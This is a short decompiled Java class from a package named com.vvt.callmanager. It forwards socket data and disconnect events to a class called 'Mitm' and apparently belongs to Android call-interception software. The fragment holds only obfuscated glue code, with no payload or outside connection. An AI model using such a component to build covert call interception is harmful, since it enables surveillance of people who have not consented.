package com.vvt.callmanager;

import android.net.LocalSocket;
import android.os.Parcel;
import com.fx.socket.e;

class i
  extends e
{
  i(Mitm paramf, LocalSocket paramLocalSocket)
  {
    super(paramLocalSocket);
  }
  
  protected void a()
  {
    boolean bool = Mitm.g();
    if (bool) {}
    Mitm.b(this.a);
  }
  
  protected void a(Parcel paramParcel)
  {
    Mitm.b(this.a, paramParcel);
  }
  
  protected void a(Exception paramException)
  {
    boolean bool = Mitm.g();
    if (bool) {}
    Mitm.b(this.a);
  }
}


/* Location:              /Volumes/D1/codebase/android/POC/assets/product/callmgr/classes-enjarify.jar!/com/vvt/callmanager/i.class
 * Java compiler version: 5 (49.0)
 * JD-Core Version:       0.7.1
 */